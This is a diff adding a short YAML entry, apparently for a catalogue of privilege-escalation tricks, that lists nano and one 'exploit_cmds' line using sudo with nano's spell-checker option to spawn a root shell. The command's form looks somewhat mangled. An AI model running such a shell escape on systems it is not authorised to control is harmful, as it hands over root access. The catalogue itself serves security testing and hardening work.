@@ -1,0 +1,4 @@
+name: nano
+binary_path: /usr/bin/nano
+exploit_cmds:
+- sudo /usr/bin/nano -s /bin/sh && /bin/sh && ^T^T
